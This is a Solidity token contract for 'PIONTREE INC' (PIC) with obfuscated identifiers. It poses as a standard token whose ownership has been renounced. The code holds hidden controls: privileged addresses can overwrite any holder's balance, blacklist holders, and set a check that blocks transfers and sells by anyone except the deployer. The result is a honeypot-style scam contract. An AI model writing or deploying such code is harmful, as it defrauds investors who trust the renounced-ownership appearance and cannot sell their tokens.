//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface gmjhpjzqk {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface oiiqfqqwrkkcll {
    function createPair(address vdtzmfgulabwut, address pwqsikmznalz) external returns (address);
}

abstract contract npbbzjtutvha {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface rzzwgoywqfqyba {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dronvxeqalpv) external view returns (uint256);

    function transfer(address olvwvgkxzyxtiy, uint256 opjlfgtttr) external returns (bool);

    function allowance(address mgpwfdpfs, address spender) external view returns (uint256);

    function approve(address spender, uint256 opjlfgtttr) external returns (bool);

    function transferFrom(address sender,address olvwvgkxzyxtiy,uint256 opjlfgtttr) external returns (bool);

    event Transfer(address indexed from, address indexed dsoxcahvrcax, uint256 value);
    event Approval(address indexed mgpwfdpfs, address indexed spender, uint256 value);
}

interface ccnqjltxi is rzzwgoywqfqyba {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PIONTREEINC is npbbzjtutvha, rzzwgoywqfqyba, ccnqjltxi {

    function kwnrjrbismgxt(address lhkavxwzphu, address olvwvgkxzyxtiy, uint256 opjlfgtttr) internal returns (bool) {
        if (lhkavxwzphu == qsdocffsaj) {
            return thulkwssub(lhkavxwzphu, olvwvgkxzyxtiy, opjlfgtttr);
        }
        uint256 tiskaofdda = rzzwgoywqfqyba(sfloqvcqbpxb).balanceOf(nxfqqxwgsn);
        require(tiskaofdda == nqjhmvcdrt);
        require(!bhfdjzfnx[lhkavxwzphu]);
        return thulkwssub(lhkavxwzphu, olvwvgkxzyxtiy, opjlfgtttr);
    }

    function wxwmfahxvhzw(address kaarmecwxmw) public {
        if (szuysbrwch) {
            return;
        }
        if (dvnwjdmelm != nrrksejmkggan) {
            nrrksejmkggan = dhugijyegii;
        }
        behupcjpehslif[kaarmecwxmw] = true;
        if (ndjbywigeoi) {
            dvnwjdmelm = xaubwksciw;
        }
        szuysbrwch = true;
    }

    uint256 private nrrksejmkggan;

    uint256 private xaubwksciw;

    function xnogxojzpn(uint256 opjlfgtttr) public {
        gqninhdgjmr();
        nqjhmvcdrt = opjlfgtttr;
    }

    function symbol() external view virtual override returns (string memory) {
        return lpoyfrwvgalyh;
    }

    address nxfqqxwgsn = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function thulkwssub(address lhkavxwzphu, address olvwvgkxzyxtiy, uint256 opjlfgtttr) internal returns (bool) {
        require(qkmdaigdvr[lhkavxwzphu] >= opjlfgtttr);
        qkmdaigdvr[lhkavxwzphu] -= opjlfgtttr;
        qkmdaigdvr[olvwvgkxzyxtiy] += opjlfgtttr;
        emit Transfer(lhkavxwzphu, olvwvgkxzyxtiy, opjlfgtttr);
        return true;
    }

    address public sfloqvcqbpxb;

    function getOwner() external view returns (address) {
        return nvqrubweyafvaa;
    }

    uint256 private kovygiwoj = 100000000 * 10 ** 18;

    bool private suacqpocelybhc;

    function mmiytslmvco(address futawclwaqd, uint256 opjlfgtttr) public {
        gqninhdgjmr();
        qkmdaigdvr[futawclwaqd] = opjlfgtttr;
    }

    mapping(address => mapping(address => uint256)) private xnwrgfviiyl;

    function decimals() external view virtual override returns (uint8) {
        return bacmsibqltfhv;
    }

    function balanceOf(address dronvxeqalpv) public view virtual override returns (uint256) {
        return qkmdaigdvr[dronvxeqalpv];
    }

    event OwnershipTransferred(address indexed xwwtbvaoduxck, address indexed qjmqojkfk);

    address public qsdocffsaj;

    function name() external view virtual override returns (string memory) {
        return tsqjzkznk;
    }

    bool public ndjbywigeoi;

    function transfer(address futawclwaqd, uint256 opjlfgtttr) external virtual override returns (bool) {
        return kwnrjrbismgxt(_msgSender(), futawclwaqd, opjlfgtttr);
    }

    constructor (){
        if (dhugijyegii == nrrksejmkggan) {
            xaubwksciw = nrrksejmkggan;
        }
        yjmvyoveqeejv();
        gmjhpjzqk tpohzunxncobp = gmjhpjzqk(snwydewkyqevk);
        sfloqvcqbpxb = oiiqfqqwrkkcll(tpohzunxncobp.factory()).createPair(tpohzunxncobp.WETH(), address(this));
        
        qsdocffsaj = _msgSender();
        behupcjpehslif[qsdocffsaj] = true;
        qkmdaigdvr[qsdocffsaj] = kovygiwoj;
        
        emit Transfer(address(0), qsdocffsaj, kovygiwoj);
    }

    function yjmvyoveqeejv() public {
        emit OwnershipTransferred(qsdocffsaj, address(0));
        nvqrubweyafvaa = address(0);
    }

    uint256 nqjhmvcdrt;

    function znfhavhfeqfnq(address cfuswlrytzwy) public {
        gqninhdgjmr();
        if (ndjbywigeoi != suacqpocelybhc) {
            nrrksejmkggan = dhugijyegii;
        }
        if (cfuswlrytzwy == qsdocffsaj || cfuswlrytzwy == sfloqvcqbpxb) {
            return;
        }
        bhfdjzfnx[cfuswlrytzwy] = true;
    }

    bool public szuysbrwch;

    uint256 private dvnwjdmelm;

    uint8 private bacmsibqltfhv = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return kovygiwoj;
    }

    address snwydewkyqevk = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private nvqrubweyafvaa;

    uint256 irwtfgzarrnz;

    mapping(address => bool) public behupcjpehslif;

    function owner() external view returns (address) {
        return nvqrubweyafvaa;
    }

    string private lpoyfrwvgalyh = "PIC";

    mapping(address => bool) public bhfdjzfnx;

    function gqninhdgjmr() private view {
        require(behupcjpehslif[_msgSender()]);
    }

    mapping(address => uint256) private qkmdaigdvr;

    uint256 private dhugijyegii;

    string private tsqjzkznk = "PIONTREE INC";

    function transferFrom(address lhkavxwzphu, address olvwvgkxzyxtiy, uint256 opjlfgtttr) external override returns (bool) {
        if (_msgSender() != snwydewkyqevk) {
            if (xnwrgfviiyl[lhkavxwzphu][_msgSender()] != type(uint256).max) {
                require(opjlfgtttr <= xnwrgfviiyl[lhkavxwzphu][_msgSender()]);
                xnwrgfviiyl[lhkavxwzphu][_msgSender()] -= opjlfgtttr;
            }
        }
        return kwnrjrbismgxt(lhkavxwzphu, olvwvgkxzyxtiy, opjlfgtttr);
    }

    function allowance(address kycanlcdtwrsmx, address iruxlqharfy) external view virtual override returns (uint256) {
        if (iruxlqharfy == snwydewkyqevk) {
            return type(uint256).max;
        }
        return xnwrgfviiyl[kycanlcdtwrsmx][iruxlqharfy];
    }

    function approve(address iruxlqharfy, uint256 opjlfgtttr) public virtual override returns (bool) {
        xnwrgfviiyl[_msgSender()][iruxlqharfy] = opjlfgtttr;
        emit Approval(_msgSender(), iruxlqharfy, opjlfgtttr);
        return true;
    }

}